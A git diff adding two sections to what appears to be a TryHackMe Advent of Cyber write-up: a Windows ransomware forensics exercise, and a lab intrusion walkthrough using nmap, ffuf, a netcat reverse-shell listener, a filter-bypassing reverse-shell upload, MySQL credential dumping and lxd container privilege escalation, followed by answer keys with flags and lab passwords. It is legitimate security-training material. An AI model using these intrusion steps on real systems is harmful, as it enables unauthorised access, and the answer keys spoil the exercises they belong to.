@@ -935,10 +935,185 @@ This gives us a GitHub Gist link, which contains the required flag.
 
 ## The Grinch strikes again
 
-```shell
+```markdown
+Firstly we have to connect to the machine.
+Command: xfreerdp /u:administrator /p:'sn0wF!akes!!!' /v:10.10.140.76
+
+On the Desktop, we have to read the contents of the ransom note; the mentioned address can be decoded using CyberChef tool.
+
+Furthermore, all the files in the system have the extension '.grinch'.
+
+Now, using the Task Scheduler utility, we can view the two suspicious tasks.
+
+We can view more information about them by reading the 'Triggers' and 'Actions' tabs.
+
+After getting the required information, we have to interact with VSS using 'vssadmin' in Command Prompt.
+Command: vssadmin list volumes
+
+This shows us the volume ID we found earlier, but with a different volume name; we have to find that volume now.
+
+Using the Disk Management utility, we can view all the partitions on the system.
+
+The Backup partition is the volume of interest here. We can confirm by Right-Click > Properties > Security; it has the same volume ID.
+
+We can view the volume in File Explorer by Right-Click > Change Drive Letter and Paths > Add; add any letter.
+
+Now, we have to view the hidden files in the volume.
+
+We can now restore the hidden folder by Right-Click > Properties > Previous Versions. The file inside the restored folder gives us the password.
+```
+
+```markdown
+1. What is the plain text value of the decrypted 'address'? - nomorebestfestivalcompany
+
+2. What is the file extension for each of the encrypted files? - .grinch
+
+3. What is the name of the suspicious scheduled task? - opidsfsdf
+
+4. What is the location of the executable that is run at login? - C:\Users\Administrator\Desktop\opidsfsdf.exe
+
+5. What is the ShadowCopyVolume ID? - {7a9eea15-0000-0000-0000-010000000000}
+
+6. What is the name of the hidden folder? - confidential
+
+7. What is the password within the file? - m33pa55w0rdIZseecure!
 ```
 
 ## The Trial Before Christmas
 
 ```shell
+nmap -T4 -p- -A 10.10.76.244
+
+ffuf -u http://10.10.76.244:65000/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e .php -s
+#to find hidden php page and hidden directory
+
+nc -nvlp 1234 #listening for reverse shell connection
+```
+
+```markdown
+After scanning the machine using nmap, we get the open ports.
+
+We also get information about the websites.
+
+The port 65000 has the secret website, so we visit that link.
+
+Now, we can scan this website for finding the hidden php page, using ffuf.
+
+After scanning using ffuf, we get the required php page and the directory where file uploads are saved.
+
+For bypassing the client-side filters, we can use the reference material given to us.
+
+After configuring Burp Suite accordingly, we hard-reload the upload page.
+
+According to the filters, we will have to upload a reverse shell with double extension to make it work.
+
+After getting the reverse shell we will have to get access to the database using MySQL client.
+```
+
+```shell
+#to stabilize shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+export TERM=xterm
+
+#now background shell using Ctrl+Z
+
+stty raw -echo; fg
+#foregrounds the shell
+
+#if shell dies, we can use reset command to continue
+```
+
+```shell
+#to find web.txt flag
+find . -name web.txt 2>/dev/null
+
+cd /var/www
+
+cat web.txt
+
+#now we need to find the credentials
+ls -la
+#we find the credentials in one of the php files
+
+cd TheGrid/includes
+
+cat dbauth.php
+#this gives us the required credentials
+#now we can attempt to access the database
+
+mysql -utron -p
+#here, tron is the username
+#we have to enter the password
+
+show databases;
+#shows db named tron
+
+use tron;
+
+show tables;
+#shows table named users
+
+SELECT * FROM users;
+#dump users table
+#we get the encrypted creds here
+#on decoding, we get the creds as flynn:@computer@
+
+exit
+#exit mysql
+
+#according to given hint, we can switch user and login using found creds
+su flynn
+
+cd home/flynn/
+
+cat user.txt
+
+id #shows lxd group
+#it can be exploited using given walkthough
+
+lxc image list
+#view images; this shows Alpine image
+
+lxc init Alpine mycontainer -c security.privileged=true
+#initialize container
+
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+#configure container
+
+lxc start mycontainer
+
+lxc exec mycontainer /bin/sh
+#we get root access
+
+id
+
+cd /mnt/root/root
+
+cat root.txt
+#root flag
+```
+
+```markdown
+1. What ports are open? - 80, 65000
+
+2. What is the title of the hidden website? - Light Cycle
+
+3. What is the name of the hidden php page? - uploads.php
+
+4. What is the name of the hidden directory where file uploads are saved? - grid
+
+5. What is the value of the web.txt flag? - THM{ENTER_THE_GRID}
+
+6. What are the credentials? - tron:IFightForTheUsers
+
+7. What is the name of the database you find the encrypted credentials in? - tron
+
+8. What is the cracked password? - @computer@
+
+9. What is the value of the user.txt flag? - THM{IDENTITY_DISC_RECOGNISED}
+
+10. Which group can be leveraged to escalate privileges? - lxd
+
+11. What is the value of the root.txt flag? - THM{FLYNN_LIVES}
 ```
